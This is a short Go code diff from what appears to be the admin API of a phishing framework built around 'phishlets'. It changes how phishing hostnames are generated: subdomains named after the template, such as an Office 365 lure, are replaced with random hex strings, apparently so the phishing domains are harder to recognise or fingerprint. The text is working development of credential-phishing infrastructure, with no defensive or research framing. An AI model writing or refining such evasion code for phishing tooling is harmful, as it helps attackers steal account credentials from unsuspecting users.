@@ -824,12 +824,13 @@ func (api *AdminAPI) handleGeneratePhishletHostname(w http.ResponseWriter, r *ht
 		return
 	}
 
-	// Use phishlet name as subdomain (e.g., o365.yourdomain.com)
-	// Clean the name to be valid subdomain
-	subdomain := strings.ToLower(strings.ReplaceAll(name, "_", "-"))
+	// Generate random subdomain (8 characters)
+	randBytes := make([]byte, 4)
+	rand.Read(randBytes)
+	randomSubdomain := hex.EncodeToString(randBytes)
 	
-	// Create full hostname using phishlet name as subdomain
-	hostname := subdomain + "." + baseDomain
+	// Create full hostname with random subdomain
+	hostname := randomSubdomain + "." + baseDomain
 
 	// Set the hostname
 	if !api.cfg.SetSiteHostname(name, hostname) {
